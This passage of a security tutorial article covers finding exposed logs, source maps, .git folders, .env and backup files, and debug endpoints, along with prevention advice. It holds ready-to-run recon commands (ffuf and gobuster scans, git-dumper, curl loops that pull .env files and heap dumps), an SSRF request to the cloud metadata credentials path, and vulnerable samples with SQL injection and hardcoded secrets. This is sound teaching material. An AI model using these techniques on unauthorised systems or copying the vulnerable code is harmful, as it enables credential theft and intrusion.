# Security Deep Dive Part 14: Internal Logs, Debug Endpoints, and Source Code Disclosure -- The Silent Recon Goldmine

---

**Series:** Application Security Deep Dive -- A Practitioner's Guide from Recon to Exploitation
**Part:** 14 (Information Disclosure)
**Audience:** Bug bounty hunters, penetration testers, security researchers, and developers who understand HTTP, Burp Suite, and modern web stacks
**Reading time:** ~50 minutes

**Meta Description:** Deep technical guide to finding and exploiting exposed logs, debug endpoints, source maps, .git folders, .env files, backup files, and verbose error messages in production applications. Includes Burp Suite workflows, real payloads, ffuf/gobuster techniques, and bug bounty report templates.

**Slug:** security-deep-dive-internal-logs-debug-endpoints-source-code-disclosure

**Keywords:** information disclosure, source code exposure, .git exposure, debug endpoints, stack trace leakage, JavaScript source maps, .env file exposure, Swagger API exposure, backup file disclosure, log file exposure, content discovery, ffuf, gobuster, Burp Suite content discovery, bug bounty information disclosure, penetration testing recon

---

## Introduction

Every application has secrets it was never supposed to tell you. Database credentials embedded in stack traces. Internal IP addresses leaked through verbose error pages. Entire source code repositories reconstructable from an exposed `.git` folder. Admin-only Swagger documentation accessible without authentication. Production debug endpoints that dump environment variables to anyone who asks.

Information disclosure vulnerabilities are the most underestimated class of bugs in application security. They rarely get Critical severity on their own, but they are the force multiplier that turns a dead-end assessment into a full compromise. A leaked `.env` file gives you the database password. An exposed `/actuator/env` endpoint reveals the AWS secret key. A `.js.map` file hands you the unminified React source with hardcoded API keys.

This is not theory. In 2023, a researcher found an exposed `.git` directory on a Fortune 500 company's subdomain, reconstructed the entire backend source code, found hardcoded AWS credentials in a config file, and pivoted to their S3 buckets containing millions of customer records. The initial finding -- a directory listing -- was trivial. The chain it enabled was devastating.

In this article, we will systematically cover every major class of information disclosure vulnerability, from log exposure and stack trace leakage to source map disclosure and debug endpoint abuse. For each, you will get real payloads, HTTP request examples, Burp Suite workflows, code-level root causes, and prevention strategies.

---

## 1. Public Application Logs Exposure

### The Attack Surface

Developers frequently write application logs to files served by the web server, or expose log endpoints for internal debugging that never get removed before production deployment. Common paths include:

```
/logs
/log
/debug/logs
/app/logs
/var/log/app.log
/logs/error.log
/logs/access.log
/server.log
/application.log
/debug.log
/wp-content/debug.log
```

### Real-World Attack Scenario

A Node.js Express application writes request logs to `/var/www/app/logs/app.log`. The static file serving middleware is misconfigured to serve the entire application directory:

```javascript
// Vulnerable Express configuration
const express = require('express');
const app = express();

// Developer intended to serve only /public, but served the app root
app.use(express.static('/var/www/app'));

app.listen(3000);
```

An attacker requests:

```http
GET /logs/app.log HTTP/1.1
Host: target.com
```

Response:

```
[2026-03-15 14:22:01] INFO: User login attempt - email=admin@target.com, ip=10.0.1.15
[2026-03-15 14:22:01] DEBUG: SQL query: SELECT * FROM users WHERE email='admin@target.com' AND password_hash='$2b$12$LJ3m5R...'
[2026-03-15 14:22:03] ERROR: Database connection failed - host=rds-prod-01.c9akj2.us-east-1.rds.amazonaws.com, user=app_prod, password=Pr0d_DB_P@ss2026!
[2026-03-15 14:22:05] INFO: AWS S3 upload - bucket=target-user-uploads, key=AKIAIOSFODNN7EXAMPLE
[2026-03-15 14:23:11] DEBUG: JWT secret used for signing: xK9#mP2$vL5nQ8wR
```

This single log file just leaked database credentials, an AWS access key, a JWT signing secret, internal IP addresses, and the database schema pattern.

### WordPress Debug Log

WordPress has a particularly common variant. When `WP_DEBUG` and `WP_DEBUG_LOG` are enabled in `wp-config.php`:

```php
define('WP_DEBUG', true);
define('WP_DEBUG_LOG', true);
```

WordPress writes debug output to `/wp-content/debug.log`, which is publicly accessible by default:

```http
GET /wp-content/debug.log HTTP/1.1
Host: target-wordpress.com
```

This log frequently contains PHP warnings that leak file paths, database query errors with table names, and plugin errors that reveal the internal architecture.

### Burp Suite Testing Workflow

1. **Passive scanning**: Burp Scanner automatically flags responses containing log-like content patterns (timestamps, log levels, stack traces).
2. **Active content discovery**: Use Burp Intruder with a wordlist targeting log paths:
   - Load your target URL as `GET /FUZZ HTTP/1.1`
   - Use the `Sniper` attack type with payload position on the path
   - Payload list: combine SecLists `Discovery/Web-Content/common.txt` with custom log paths
   - Filter results by response code (200, 403 -- 403 confirms existence) and response length

3. **Burp Extensions**: Install `Logger++` to capture all traffic and search for leaked credentials in responses across your entire session.

### Manual Testing with ffuf

```bash
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -mc 200,301,302,403 \
  -fc 404 \
  -o logs_scan.json \
  -of json

# Targeted log file scan
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/logs.txt \
  -mc 200 \
  -fs 0
```

---

## 2. Stack Traces Leaking Sensitive Information

### The Problem

When an application throws an unhandled exception in production, the default behavior in many frameworks is to render the full stack trace to the client. Stack traces are a treasure trove of internal information:

- **File paths**: Reveal operating system, deployment structure, and username (`/home/deploy/app/src/controllers/auth.js`)
- **Database credentials**: Connection string errors include host, port, username, and sometimes password
- **Internal IPs**: Backend service addresses in connection errors
- **Framework versions**: Exact version numbers enable targeted CVE exploitation
- **Business logic**: Function names and call chains reveal how the application works internally

### Node.js Stack Trace in Production

A vulnerable Express application with no custom error handler:

```javascript
const express = require('express');
const { Pool } = require('pg');
const app = express();

const pool = new Pool({
  host: 'prod-db.internal.target.com',
  port: 5432,
  user: 'app_service',
  password: 'S3cur3_Pr0d_P@ss!',
  database: 'target_prod'
});

app.get('/api/users/:id', async (req, res) => {
  // No input validation, no error handling
  const result = await pool.query(`SELECT * FROM users WHERE id = ${req.params.id}`);
  res.json(result.rows);
});

// No custom error handler -- Express default sends stack trace in development mode
// But even in "production", unhandled promise rejections can leak info

app.listen(3000);
```

When you send a malformed request:

```http
GET /api/users/abc' HTTP/1.1
Host: target.com
```

Response:

```json
{
  "error": {
    "message": "error: invalid input syntax for type integer: \"abc'\"",
    "stack": "error: invalid input syntax for type integer: \"abc'\"\n    at Parser.parseErrorMessage (/home/deploy/target-app/node_modules/pg-protocol/src/parser.ts:369:69)\n    at Parser.handlePacket (/home/deploy/target-app/node_modules/pg-protocol/src/parser.ts:188:21)\n    at /home/deploy/target-app/src/controllers/userController.js:42:15\n    at processTicksAndRejections (node:internal/process/task_queues:95:5)",
    "detail": "Connection to prod-db.internal.target.com:5432 as app_service"
  }
}
```

Leaked information: deployment path (`/home/deploy/target-app`), internal database hostname, database username, the exact line of code that failed, Node.js version hints, and the `pg` library version.

### FastAPI Debug Mode in Production

FastAPI with `debug=True` returns rich HTML error pages:

```python
from fastapi import FastAPI
import databases

DATABASE_URL = "postgresql://admin:Adm1n_Pr0d_2026@db.internal.target.com:5432/app_db"
database = databases.Database(DATABASE_URL)

app = FastAPI(debug=True)  # Left enabled in production

@app.get("/api/orders/{order_id}")
async def get_order(order_id: int):
    query = f"SELECT * FROM orders WHERE id = {order_id}"
    return await database.fetch_one(query)
```

Trigger the error:

```http
GET /api/orders/notanumber HTTP/1.1
Host: target.com
```

FastAPI returns a full traceback page including the entire source code of the failing function, all local variables (including the `DATABASE_URL` with credentials), and the full Python environment.

### Triggering Stack Traces Deliberately

Experienced testers know how to provoke stack traces even when normal usage does not trigger them:

```http
# Type confusion -- send string where integer expected
GET /api/items/undefined HTTP/1.1

# Oversized input
POST /api/search HTTP/1.1
Content-Type: application/json

{"query": "AAAAAAAAAAAAA...(10000 A's)...AAAAAAA"}

# Null bytes
GET /api/users/123%00%00 HTTP/1.1

# Unexpected content type
POST /api/data HTTP/1.1
Content-Type: application/xml

<xml>unexpected</xml>

# Negative or extreme integers
GET /api/page/-1 HTTP/1.1
GET /api/page/99999999999999999999 HTTP/1.1
```

---

## 3. JavaScript Source Maps Exposure

### How Source Maps Work

Modern JavaScript applications are built with tools like Webpack, Vite, Rollup, or esbuild. The production bundle is minified and mangled -- variable names are shortened, whitespace is removed, and the code becomes unreadable. Source maps (`.js.map` files) are the reverse mapping that lets browser DevTools reconstruct the original source.

The minified bundle contains a reference to its source map:

```javascript
// At the end of bundle.js:
//# sourceMappingURL=bundle.js.map
```

### The Attack

If `.js.map` files are deployed to production and accessible, any attacker can reconstruct the entire original source code:

```http
GET /static/js/main.a1b2c3d4.js HTTP/1.1
Host: target.com
```

Check the last line for a sourceMappingURL, then fetch it:

```http
GET /static/js/main.a1b2c3d4.js.map HTTP/1.1
Host: target.com
```

The `.map` file is a JSON document containing:

```json
{
  "version": 3,
  "file": "main.a1b2c3d4.js",
  "sources": [
    "webpack:///src/index.tsx",
    "webpack:///src/App.tsx",
    "webpack:///src/components/AdminPanel.tsx",
    "webpack:///src/api/auth.ts",
    "webpack:///src/api/payments.ts",
    "webpack:///src/config/settings.ts",
    "webpack:///src/utils/crypto.ts"
  ],
  "sourcesContent": [
    "// Full original source code here...",
    "// Every single file, unminified..."
  ],
  "mappings": "AAAA,SAAS,OAAO..."
}
```

The `sourcesContent` array contains the complete, unminified source code of every file in the application. This gives the attacker:

- **Hardcoded API keys and secrets** in config files
- **Business logic** for payment processing, access control, and data validation
- **Hidden API endpoints** not visible in the UI
- **Client-side security controls** that can be bypassed
- **Comments** from developers (sometimes containing TODOs with security implications)

### Reconstructing Source with `unwebpack-sourcemap`

```bash
# Install the tool
npm install -g unwebpack-sourcemap

# Download and extract source code
unwebpack-sourcemap --make-directory https://target.com/static/js/main.a1b2c3d4.js.map output_dir

# Or use smap (another tool)
npm install -g smap
smap https://target.com/static/js/main.a1b2c3d4.js.map -o extracted_source
```

Now you have the complete React/Vue/Angular source tree, ready to grep for secrets:

```bash
# Search extracted source for sensitive data
grep -rn "API_KEY\|SECRET\|PASSWORD\|TOKEN\|api_key\|apiKey" extracted_source/
grep -rn "https://.*internal\|10\.\|172\.1[6-9]\.\|172\.2[0-9]\.\|172\.3[0-1]\.\|192\.168\." extracted_source/
grep -rn "admin\|/debug\|/internal" extracted_source/
```

### Real Finding Example

Extracted from a source map on a fintech application:

```typescript
// src/config/api.ts (extracted from source map)
export const API_CONFIG = {
  baseUrl: process.env.REACT_APP_API_URL || 'https://api.target.com',
  stripePublicKey: 'pk_live_51H7...',
  stripeSecretKey: 'sk_live_51H7...', // Developer accidentally put secret key in frontend
  internalAdminApi: 'https://admin-api.internal.target.com',
  debugEndpoint: '/api/v1/internal/debug',
  featureFlags: {
    bypassPayment: false, // Set to true for testing
    adminOverride: 'X-Admin-Override: true'
  }
};
```

### Burp Suite Workflow for Source Maps

1. Browse the target application through Burp Proxy
2. Go to **Target > Site Map** and look for `.js` files
3. For each JavaScript file, right-click and **Send to Repeater**
4. Append `.map` to the URL and send the request
5. If you get a 200 response with JSON content, you have source maps
6. Alternatively, use **Burp Intruder** to batch-test all JS files:
   - Extract all `.js` URLs from the site map
   - Add `.map` suffix to each
   - Run the scan and filter for 200 responses

Automated approach:

```bash
# Extract JS files from a page and check for source maps
curl -s https://target.com | grep -oP 'src="[^"]*\.js"' | sed 's/src="//;s/"//' | while read js; do
  mapurl="${js}.map"
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com${mapurl}")
  if [ "$status" = "200" ]; then
    echo "[FOUND] Source map: https://target.com${mapurl}"
  fi
done
```

---

## 4. Public .git Folder Exposure

### Why This Is Devastating

When a `.git` directory is accessible on a web server, the entire version control history of the application is exposed. This includes every commit, every branch, every file ever tracked -- including files that were deleted. Developers who "removed" credentials in a later commit still have those credentials in the git history.

### Detection

```http
GET /.git/HEAD HTTP/1.1
Host: target.com
```

If the response contains:

```
ref: refs/heads/main
```

The `.git` directory is exposed. Other confirming requests:

```http
GET /.git/config HTTP/1.1
Host: target.com
```

Response revealing the origin remote:

```
[core]
    repositoryformatversion = 0
    filemode = true
    bare = false
    logallrefupdates = true
[remote "origin"]
    url = git@github.com:target-org/target-backend.git
    fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
    remote = origin
    merge = refs/heads/main
[user]
    name = John Developer
    email = john@target.com
```

This leaks the GitHub organization, the repository name (which might be private), and the developer's identity.

### Reconstructing the Source Code with git-dumper

```bash
# Install git-dumper
pip install git-dumper

# Dump the entire repository
git-dumper https://target.com/.git/ target-source

# Now you have a full git repository
cd target-source
git log --oneline

# Look for sensitive data in history
git log --all --diff-filter=D -- "*.env" "*.pem" "*.key" "*config*" "*secret*"

# Check every commit for credentials
git log --all -p | grep -i "password\|secret\|api_key\|token\|credential"

# Find deleted files
git log --all --diff-filter=D --summary | grep "delete mode"

# Restore deleted files
git log --all --diff-filter=D --summary | grep "delete mode" | awk '{print $4}' | while read file; do
  git log --all -- "$file" | head -1 | awk '{print $2}' | xargs -I {} git show {}^:"$file" > "recovered_${file//\//_}" 2>/dev/null
done
```

### Manual .git Reconstruction (When Directory Listing Is Disabled)

Even without directory listing, you can manually reconstruct the repository because the `.git` internal structure is predictable:

```bash
# Step 1: Get HEAD reference
curl -s https://target.com/.git/HEAD
# Returns: ref: refs/heads/main

# Step 2: Get the commit hash
curl -s https://target.com/.git/refs/heads/main
# Returns: a1b2c3d4e5f6...

# Step 3: Download the object (git objects are at .git/objects/XX/XXXXXXX)
# For commit hash a1b2c3d4e5f6...
curl -s https://target.com/.git/objects/a1/b2c3d4e5f6... -o object.bin

# Step 4: Decompress and parse
python3 -c "import zlib,sys; print(zlib.decompress(open('object.bin','rb').read()).decode('utf-8',errors='replace'))"
```

The `git-dumper` tool automates this entire process, following the object graph from HEAD through every tree and blob to reconstruct the full repository.

### What to Search for After Extraction

```bash
# Environment files
find . -name ".env*" -o -name "*.env"

# Configuration files
find . -name "config.*" -o -name "settings.*" -o -name "secrets.*"

# AWS credentials
grep -rn "AKIA" .
grep -rn "aws_secret_access_key\|aws_access_key_id" .

# Private keys
find . -name "*.pem" -o -name "*.key" -o -name "id_rsa"

# Database credentials
grep -rn "DB_PASSWORD\|DATABASE_URL\|MONGO_URI\|REDIS_URL" .

# API keys and tokens
grep -rn "sk_live\|pk_live\|ghp_\|glpat-\|xoxb-\|xoxp-" .
```

---

## 5. Public Swagger/OpenAPI Documentation

### The Risk

Swagger UI and OpenAPI specification files are invaluable for developers -- and equally invaluable for attackers. When left accessible in production, they reveal:

- Every API endpoint, including internal/admin endpoints
- Request/response schemas with field names and types
- Authentication mechanisms
- Hidden query parameters
- Example values that sometimes contain real data

### Common Swagger/OpenAPI Paths

```
/swagger
/swagger-ui
/swagger-ui.html
/swagger-ui/index.html
/api-docs
/api/docs
/docs
/redoc
/api/swagger.json
/api/v1/swagger.json
/v1/api-docs
/v2/api-docs
/openapi.json
/openapi.yaml
/api/openapi.json
/swagger/v1/swagger.json
/.well-known/openapi.json
```

### Attack Scenario

You discover `/api-docs` on a target:

```http
GET /api-docs HTTP/1.1
Host: target.com
```

The OpenAPI spec reveals:

```json
{
  "openapi": "3.0.0",
  "paths": {
    "/api/v1/admin/users": {
      "get": {
        "summary": "List all users (admin only)",
        "security": [{"bearerAuth": []}],
        "parameters": [
          {"name": "include_deleted", "in": "query", "schema": {"type": "boolean"}},
          {"name": "export_format", "in": "query", "schema": {"type": "string", "enum": ["json", "csv"]}}
        ]
      }
    },
    "/api/v1/internal/health": {
      "get": {
        "summary": "Internal health check with debug info",
        "security": []
      }
    },
    "/api/v1/admin/impersonate/{userId}": {
      "post": {
        "summary": "Impersonate a user (super admin only)",
        "security": [{"bearerAuth": []}]
      }
    },
    "/api/v1/internal/cache/flush": {
      "post": {
        "summary": "Flush application cache",
        "security": [{"apiKey": []}]
      }
    }
  }
}
```

Now the attacker knows about the impersonation endpoint, the unauthenticated health check, the cache flush mechanism, and query parameters like `include_deleted` and `export_format` that are not exposed in the UI.

### FastAPI Default Documentation Exposure

FastAPI automatically generates and serves documentation:

```python
from fastapi import FastAPI

app = FastAPI()  # Docs served at /docs and /redoc by default

@app.get("/api/internal/metrics")
async def internal_metrics():
    """Returns internal application metrics. Should only be accessible from VPN."""
    return {"db_connections": 42, "queue_depth": 156, "cache_hit_rate": 0.87}
```

By default, `/docs` (Swagger UI) and `/redoc` (ReDoc) are publicly accessible and document every route, including internal ones.

**Prevention:**

```python
from fastapi import FastAPI

# Disable docs in production
app = FastAPI(
    docs_url=None if os.environ.get("ENV") == "production" else "/docs",
    redoc_url=None if os.environ.get("ENV") == "production" else "/redoc",
    openapi_url=None if os.environ.get("ENV") == "production" else "/openapi.json"
)
```

---

## 6. Debug Endpoints Left in Production

### The Catalog of Debug Endpoints

These endpoints are commonly left accessible in production deployments:

**Spring Boot Actuator (Java):**
```
/actuator
/actuator/env          -- Environment variables including secrets
/actuator/configprops  -- Configuration properties with credentials
/actuator/heapdump     -- JVM heap dump (can contain secrets in memory)
/actuator/threaddump   -- Thread dump
/actuator/mappings     -- All URL mappings
/actuator/beans        -- All Spring beans
/actuator/health       -- Health check with internal details
/actuator/info         -- Application info
/actuator/loggers      -- Logger configuration (can be modified!)
/actuator/metrics      -- Application metrics
/actuator/trace        -- Recent HTTP requests with headers
```

**PHP:**
```
/phpinfo.php
/phpinfo
/info.php
/php_info.php
/test.php
/i.php
```

**Django:**
```
/__debug__/
/_debug/
/admin/
/silk/            -- Django Silk profiler
/silk/requests/
```

**Node.js/Express:**
```
/debug
/debug/vars
/debug/pprof
/_debug
/api/debug
/status
/health
/healthcheck
/_health
```

**General:**
```
/server-status     -- Apache mod_status
/server-info       -- Apache mod_info
/nginx_status      -- Nginx stub_status
/.well-known/
/metrics           -- Prometheus metrics
/graphql           -- GraphQL introspection
```

### Spring Boot Actuator Exploitation

The `/actuator/env` endpoint is one of the most dangerous debug endpoints. It dumps all environment variables:

```http
GET /actuator/env HTTP/1.1
Host: target.com
```

```json
{
  "activeProfiles": ["production"],
  "propertySources": [
    {
      "name": "systemEnvironment",
      "properties": {
        "AWS_ACCESS_KEY_ID": {"value": "AKIAIOSFODNN7EXAMPLE"},
        "AWS_SECRET_ACCESS_KEY": {"value": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"},
        "DB_PASSWORD": {"value": "pr0d_p@ssw0rd_2026"},
        "JWT_SECRET": {"value": "super-secret-jwt-key-do-not-share"},
        "STRIPE_SECRET_KEY": {"value": "sk_live_51H7..."},
        "SMTP_PASSWORD": {"value": "email_relay_password"}
      }
    }
  ]
}
```

The `/actuator/heapdump` endpoint is even more dangerous. It downloads the JVM heap, which can be analyzed for in-memory secrets:

```bash
# Download heap dump
curl -o heapdump https://target.com/actuator/heapdump

# Analyze with Eclipse MAT or strings
strings heapdump | grep -i "password\|secret\|key\|token"

# Use jhat for structured analysis
jhat heapdump
# Opens web UI on port 7000 for OQL queries
```

### AWS Metadata Endpoint via SSRF

If a debug endpoint allows arbitrary URL fetching, you can pivot to the AWS metadata service:

```http
GET /debug/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: target.com
```

This is covered in depth in the SSRF article, but the key point is that debug endpoints are frequently the entry point for SSRF attacks.

---

## 7. Backup Files Exposure

### Common Backup File Patterns

Developers and editors create backup files that the web server happily serves:

```
/index.php.bak
/index.php.old
/index.php~
/index.php.swp        -- Vim swap file
/.index.php.swp       -- Vim swap file (hidden)
/index.php.save       -- Nano recovery file
/#index.php#           -- Emacs auto-save
/config.yml.bak
/database.sql
/backup.sql
/dump.sql
/db.sql
/.DS_Store             -- macOS directory metadata
/Thumbs.db            -- Windows thumbnail cache
/web.config.bak       -- IIS configuration backup
/.htaccess.bak        -- Apache configuration backup
```

### .DS_Store Exploitation

macOS creates `.DS_Store` files in every directory that Finder opens. When deployed to a web server, these files reveal the directory structure:

```http
GET /.DS_Store HTTP/1.1
Host: target.com
```

The file is binary but can be parsed:

```bash
# Install ds_store parser
pip install ds_store

# Parse the file
python3 -c "
from ds_store import DSStore
with DSStore.open('DS_Store', 'r') as d:
    for entry in d:
        print(entry.filename)
"
```

This reveals filenames in the directory that you did not know existed -- potentially including backup files, config files, or hidden admin pages.

### Vim Swap File Exploitation

When Vim crashes or a session is interrupted, it leaves `.swp` files. These contain the original file content:

```http
GET /.config.php.swp HTTP/1.1
Host: target.com
```

Recover the content:

```bash
# Download the swap file
curl -o config.php.swp https://target.com/.config.php.swp

# Recover with vim
vim -r config.php.swp -c ':w recovered_config.php' -c ':q!'

# Or parse manually -- swap files contain the original text
strings config.php.swp
```

### WordPress wp-config.php.bak Exposure

This is one of the most common and most impactful backup file findings:

```http
GET /wp-config.php.bak HTTP/1.1
Host: target.com
```

A successful response returns the raw PHP source of `wp-config.php`, which contains:

```php
define('DB_NAME', 'wordpress_prod');
define('DB_USER', 'wp_admin');
define('DB_PASSWORD', 'Str0ng_P@ss_2026!');
define('DB_HOST', 'mysql.internal.target.com');

define('AUTH_KEY',         'unique-phrase-here');
define('SECURE_AUTH_KEY',  'unique-phrase-here');
define('LOGGED_IN_KEY',    'unique-phrase-here');
define('NONCE_KEY',        'unique-phrase-here');
define('AUTH_SALT',        'unique-phrase-here');
define('SECURE_AUTH_SALT', 'unique-phrase-here');
define('LOGGED_IN_SALT',   'unique-phrase-here');
define('NONCE_SALT',       'unique-phrase-here');
```

With the authentication keys and salts, an attacker can forge WordPress authentication cookies. With the database credentials, they can connect directly if the database port is exposed.

### Comprehensive Backup File Scan with ffuf

```bash
# Generate backup variants for known files
# If you know the target has /config.php, check:
ffuf -u https://target.com/config.phpFUZZ \
  -w <(echo -e ".bak\n.old\n.orig\n.save\n.swp\n~\n.tmp\n.backup\n.copy\n.1\n.2\n_backup\n-backup\n.dist\n.sample") \
  -mc 200

# Broad backup file scan
ffuf -u https://target.com/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -e .bak,.old,.swp,.save,.orig,.tmp,~,.backup,.sql,.gz,.zip,.tar \
  -mc 200 \
  -fc 404 \
  -t 50
```

---

## 8. .env File Exposure

### Why .env Files Are Everywhere

The dotenv pattern is ubiquitous in modern development. Node.js, Python, Ruby, PHP, and Go projects all use `.env` files to store configuration:

```
DATABASE_URL=postgresql://admin:P@ssw0rd_2026@db.target.com:5432/app_prod
REDIS_URL=redis://:redis_pass@cache.internal.target.com:6379
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
JWT_SECRET=my-super-secret-jwt-signing-key-never-share
STRIPE_SECRET_KEY=sk_live_51H7xxxxxxxxxxxxxxxxxxx
SENDGRID_API_KEY=SG.xxxxxxxxxxxxxxxxxx
GITHUB_TOKEN=ghp_xxxxxxxxxxxxxxxxxxxx
ENCRYPTION_KEY=aes-256-cbc-key-here
SESSION_SECRET=session-secret-value
```

### How .env Gets Exposed

**Misconfigured static file serving in Express:**

```javascript
// Serving the project root as static files
app.use(express.static(path.join(__dirname)));

// Or serving parent directory
app.use(express.static(path.join(__dirname, '..')));
```

**Nginx misconfiguration:**

```nginx
server {
    root /var/www/app;
    
    location / {
        try_files $uri $uri/ /index.html;
    }
    
    # Missing: block dotfiles
    # Should have:
    # location ~ /\. {
    #     deny all;
    # }
}
```

**Apache without .htaccess protection:**

The default Apache configuration does not block dotfiles. Without explicit rules, `.env` is served as a static file.

### Testing for .env Exposure

```http
GET /.env HTTP/1.1
Host: target.com

GET /.env.local HTTP/1.1
Host: target.com

GET /.env.production HTTP/1.1
Host: target.com

GET /.env.production.local HTTP/1.1
Host: target.com

GET /.env.backup HTTP/1.1
Host: target.com

GET /app/.env HTTP/1.1
Host: target.com

GET /api/.env HTTP/1.1
Host: target.com

GET /../.env HTTP/1.1
Host: target.com
```

### Automated .env Scanning

```bash
# Check multiple .env variants
for path in ".env" ".env.local" ".env.production" ".env.staging" ".env.development" ".env.bak" ".env.old" ".env.example" "env" ".env.prod" ".env.dev"; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/${path}")
  if [ "$status" = "200" ]; then
    echo "[FOUND] https://target.com/${path}"
    curl -s "https://target.com/${path}" | head -5
    echo "---"
  fi
done
```

---

## 9. Verbose Error Messages Revealing Internal Architecture

### Extracting Architecture from Errors

Even when full stack traces are suppressed, verbose error messages can reveal critical information:

**Database type and version:**

```json
{
  "error": "relation \"users\" does not exist",
  "code": "42P01"
}
```

This PostgreSQL-specific error code and message confirms the database technology.

**Internal service names:**

```json
{
  "error": "upstream connect error or disconnect/reset before headers. retried and the latest reset reason: connection failure, transport failure reason: delayed connect error: 111",
  "details": "service 'payment-service.internal.svc.cluster.local:8080' unavailable"
}
```

This reveals Kubernetes internal service naming, the service mesh architecture, and internal port numbers.

**Framework detection through error formatting:**

```json
// Django
{"detail": "Method \"DELETE\" not allowed."}

// FastAPI
{"detail": [{"loc": ["query", "page"], "msg": "value is not a valid integer", "type": "type_error.integer"}]}

// Express with default error handler
{"error": {"message": "Cannot GET /nonexistent", "status": 404}}

// Spring Boot
{"timestamp": "2026-03-15T14:30:00.000+00:00", "status": 500, "error": "Internal Server Error", "path": "/api/data"}

// Laravel
{"message": "The given data was invalid.", "errors": {"email": ["The email field is required."]}}
```

Each framework has a distinctive error response format that confirms the technology stack.

### Provocation Techniques

```http
# Send unexpected HTTP methods
PATCH /api/users HTTP/1.1

# Send malformed JSON
POST /api/users HTTP/1.1
Content-Type: application/json

{malformed json here

# Send extremely large headers
GET / HTTP/1.1
Host: target.com
X-Custom: AAAA...(8000 bytes)...AAAA

# Request non-existent API versions
GET /api/v99/users HTTP/1.1

# Send conflicting content types
POST /api/users HTTP/1.1
Content-Type: application/xml

{"json": "but header says xml"}
```

---

## 10. Burp Suite Content Discovery Workflow

### Comprehensive Reconnaissance Methodology

**Step 1: Passive Crawl**

1. Configure browser to proxy through Burp (127.0.0.1:8080)
2. Browse the entire target application manually
3. Check **Target > Site Map** for the full URL tree
4. Right-click the target domain and select **Engagement Tools > Discover Content**

**Step 2: Active Content Discovery**

Burp's built-in content discovery:
1. Right-click on the target in Site Map
2. Select **Engagement Tools > Discover Content**
3. Configure:
   - **Discovery engine**: Use built-in smart wordlist
   - **File extensions**: php, asp, aspx, jsp, py, rb, js, json, xml, yml, yaml, env, bak, old, swp, sql, log, conf, config, txt, md
   - **Directory depth**: 3-4 levels
   - Enable **Follow redirections**
4. Start the discovery and monitor results

**Step 3: Targeted Intruder Scans**

For specific vulnerability classes, use Burp Intruder with curated wordlists:

```
# Git exposure check
GET /.git/FUZZ HTTP/1.1

Payloads: HEAD, config, index, objects/, refs/, logs/HEAD, COMMIT_EDITMSG, description, packed-refs
```

```
# Debug endpoint check
GET /FUZZ HTTP/1.1

Payloads: actuator, actuator/env, actuator/heapdump, phpinfo.php, debug, _debug, 
server-status, server-info, metrics, health, status, graphql, console, 
admin, manage, management, monitoring, trace, api-docs, swagger, swagger-ui.html
```

**Step 4: Response Analysis**

Use Burp's **Search** function (Ctrl+Shift+F) across all recorded traffic:

- Search for: `password`, `secret`, `key`, `token`, `credential`
- Search for: `stack trace`, `Exception`, `Error at`, `Traceback`
- Search for: `10.`, `172.16.`, `192.168.`, `internal`, `.local`
- Search for: `sourceMappingURL`

### ffuf and Gobuster Methodology

**ffuf (preferred for speed and flexibility):**

```bash
# General content discovery
ffuf -u https://target.com/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt \
  -mc 200,301,302,403 \
  -fc 404 \
  -t 100 \
  -o ffuf_results.json \
  -of json

# Recursive directory brute force
ffuf -u https://target.com/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -recursion \
  -recursion-depth 3 \
  -mc 200,301,302,403 \
  -fc 404 \
  -e .php,.html,.js,.json,.xml,.txt,.env,.bak,.old,.sql,.log,.yml,.yaml,.conf \
  -t 80

# Focused sensitive file scan
ffuf -u https://target.com/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt \
  -mc 200 \
  -t 50

# Virtual host discovery
ffuf -u https://target.com \
  -H "Host: FUZZ.target.com" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs 4242  # Filter by size of default response
```

**Gobuster:**

```bash
# Directory mode
gobuster dir -u https://target.com \
  -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt \
  -x php,html,js,json,xml,txt,env,bak,old,sql,log,yml,yaml,conf \
  -t 50 \
  -o gobuster_results.txt \
  --status-codes 200,301,302,403 \
  --no-error

# DNS subdomain mode
gobuster dns -d target.com \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -t 50
```

---

## 11. Common Developer Mistakes

### Node.js Express Mistakes

```javascript
// MISTAKE 1: No custom error handler in production
// Express default error handler sends stack traces when NODE_ENV !== 'production'
const app = express();
// Missing: app.set('env', 'production') or NODE_ENV=production

// MISTAKE 2: Serving the project root as static files
app.use(express.static(__dirname)); // Exposes .env, package.json, source code

// MISTAKE 3: Logging sensitive data
const logger = require('morgan');
app.use(logger('dev')); // Logs request bodies which may contain passwords

// MISTAKE 4: Leaving debug routes
app.get('/debug/config', (req, res) => {
  res.json(process.env); // Dumps all environment variables
});

// MISTAKE 5: Sending raw errors to client
app.get('/api/data', async (req, res) => {
  try {
    const data = await db.query('SELECT * FROM data');
    res.json(data);
  } catch (err) {
    res.status(500).json({ error: err.message, stack: err.stack }); // Never do this
  }
});
```

**Correct approach:**

```javascript
const express = require('express');
const app = express();

// Serve only the designated public directory
app.use(express.static(path.join(__dirname, 'public')));

// Custom error handler that never leaks internals
app.use((err, req, res, next) => {
  // Log full error internally
  console.error('Internal error:', {
    message: err.message,
    stack: err.stack,
    url: req.originalUrl,
    method: req.method,
    ip: req.ip,
    timestamp: new Date().toISOString()
  });

  // Send sanitized response to client
  const statusCode = err.statusCode || 500;
  res.status(statusCode).json({
    error: statusCode === 500 ? 'Internal Server Error' : err.message,
    requestId: req.id // For correlation with internal logs
  });
});
```

### FastAPI Mistakes

```python
# MISTAKE 1: Debug mode in production
app = FastAPI(debug=True)

